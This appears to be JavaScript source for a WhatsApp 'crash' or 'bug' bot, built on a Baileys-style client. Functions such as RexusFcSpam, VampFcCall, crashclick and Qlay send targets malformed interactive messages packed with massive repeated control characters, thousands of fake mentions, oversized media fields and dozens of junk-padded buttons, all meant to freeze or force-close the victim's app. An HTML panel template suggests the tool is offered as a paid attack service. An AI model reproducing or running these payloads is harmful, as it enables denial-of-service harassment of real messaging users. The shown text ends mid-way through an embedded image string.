                            fileName: "⟅ ༑🕷️ 𝐗͜-𝐆͡𝐅͢𝐎͜𝐑͡𝐂͢𝐄⟅ ༑ ▾",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "www.com"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, message, { participant: { jid: target } });
}

    
//FUNC FORCE CLOSE SPAM

async function RexusFcSpam(target) {
    sock.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
                    title: "EVOURTH?? IS BACKK",
                    hasMediaAttachment: false
                },
                body: {
                    text: "ꦾ".repeat(90000) + "@8".repeat(90000),
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                        { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                    ]
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function VampFcCall(target, ptcp = true) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "RII?? IS COMING",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "\u0003".repeat(9999),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, ptcp ? {
        participant: {
            jid: target
        }
    } : {});

}
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function crashclick(sock, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
        fileLength: "9999999999999",
        height: 9999,
        width: 9999,
        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
        directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1755254367",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAB..."
    };

    const contextInfo = {
        participant: target,
        mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
            }
        }
    };

    const Interactive = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo,
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: { hasMediaAttachment: true, imageMessage },
                            body: { text: "⎋ꏂ꒦ꄲ꒤ꋪ꓄ꁝꉧꉔ-‣" + "\u0000".repeat(5000) },
                            nativeFlowMessage: {
                                buttons: Array.from({ length: 10 }, () => ([
                                    { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_open_native_flow", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_location", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_payment", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_share_app", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_reminder", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_join_group", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) }
                                ])).flat(),
                                messageParamsJson: "{".repeat(10000)
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, Interactive, {
        messageId: null,
        userJid: target
    });
}


async function Qlay(sock, target) {
 const baten = [
 { name: "single_select", buttonParamsJson: "" }
 ];

 for (let i = 0; i < 1000; i++) {
 baten.push(
 { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
 { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\u0000".repeat(5000) }) },
 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\x10".repeat(5000) }) }
 );
 }
  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "мєтα αι",
    },
    nativeFlowMessage: {
      buttons: baten,
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "мєтα αι",
            },
            carouselMessage: {
              cards: Array(10).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
 participant: X,
 mentionedJid: [
 "0@s.whatsapp.net",
 ...Array.from(
 { length: 2000 },
 () =>
 "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
 ),
 ],
 remoteJid: "X",
 participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 stanzaId: "123",
 quotedMessage: {
 paymentInviteMessage: {
 serviceType: 3,
 expiryTimestamp: Date.now() + 1814400000
 },
 forwardedAiBotMessageInfo: {
 botName: "META AI",
 botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
 creatorName: "Bot"
 },
 },
 },
            },
          },
        },
      },
    
    {}
  );
  console.log("Message sent successfully!");
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
}


// ==================== HTML TEMPLATE ==================== //
   
      
              const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <title>EvourthXellent Execution</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: 'Poppins', sans-serif;
        background: url('https://www.transparenttextures.com/patterns/clouds.png'),
                    linear-gradient(to bottom, #001f3f, #003366, #004080, #336699);
        background-size: cover;
        background-attachment: fixed;
        color: #fff;
      }
      .container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .card {
        background: rgba(0, 10, 40, 0.8);
        border: 2px solid #00ffff;
        box-shadow: 0 0 30px #00ccff, 0 0 60px #0066ff;
        border-radius: 20px;
        padding: 30px;
        width: 420px;
        text-align: center;
        backdrop-filter: blur(12px);
      }
      .logo {
        width: 100px;
        height: 100px;
        border-radius: 50%;
        margin: 0 auto 15px auto;
        background: url('data:image/jpeg;base64,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